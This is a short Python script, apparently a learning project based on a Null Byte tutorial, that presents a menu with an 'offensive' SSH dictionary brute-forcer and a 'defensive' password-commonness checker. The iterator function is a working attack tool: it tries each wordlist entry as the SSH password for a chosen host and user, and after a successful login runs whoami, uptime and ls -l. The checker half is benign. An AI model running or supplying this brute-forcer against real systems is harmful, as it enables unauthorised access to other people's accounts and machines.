# Import libraries
from pexpect import pxssh
import time
import getpass
import sys

# Declare variables

# Declare functions


def iterator():
    host = input("Enter target host:  ")
    username = input("Enter target username:  ")
    filepath = input("Enter your dictionary filepath:  ")
    # filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
    file = open(filepath, encoding="ISO-8859-1")  # address encoding problem
    line = file.readline()
    success = "no"
    if success == "no":
        while line:
            line = line.rstrip()
            pwd = line
            print(f"Checking '{pwd}'...")
            s = pxssh.pxssh()

            try:
                s.login(host, username, pwd)
                print("\nYou're in!")
                s.sendline('whoami')
                s.prompt()
                # print everything before the prompt.
                print(f"Username: {str(s.before)[12:-5]}  Password: {pwd}")
                s.sendline('uptime')
                s.prompt()
                # use .decode() for human-friendly formatting
                print((s.before).decode())
                s.sendline('ls -l')
                s.prompt()
                print((s.before).decode())
                s.logout()
                success = "yes"
                print("[*] Mission accomplished, returning to menu.")
                break

            except pxssh.ExceptionPxssh as e:
                print("Login attempt failed.")

            except KeyboardInterrupt:  # graceful exit message if user hits CTRL C
                print("\n\n[*] User requested an interrupt")
                sys.exit()

            time.sleep(.5)
            line = file.readline()

        file.close()
    else:
        exit


def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password:  ")
    usr_filepath = input(
        "Let's check the strength of that password.\nPlease enter a word dictionary filepath:\n")
    # usr_filepath = '/home/osboxes/Desktop/rockyou2.txt' # test filepath
    print(
        f"Checking password against the words in '{usr_filepath},' just a moment...")
    t1 = time.time()
    # address encoding problem
    file = open(usr_filepath, encoding="ISO-8859-1")
    line = file.readline()
    wordlist = []
    while line:
        line = line.rstrip()
        word = line
        wordlist.append(word)
        line = file.readline()
    file.close()
    if usr_password not in wordlist:
        print("Your password is acceptable. Good job.")
        strength = True
    elif usr_password in wordlist:
        print("That password is too common!")
        strength = False
        while strength is False:
            new_password = getpass.getpass(
                prompt="Please try a different password:  ")
            if new_password in wordlist:
                print("Still too common!")
            elif new_password not in wordlist:
                strength = True
                print("Good job, you got it now.")
    t2 = time.time()
    print("\nTime taken to scan: %.6f" % (t2 - t1))

# Main


if __name__ == "__main__":  # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            check_password()
        elif (mode == '3'):
            break
        else:
            print("Invalid selection...")

# resource: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# End
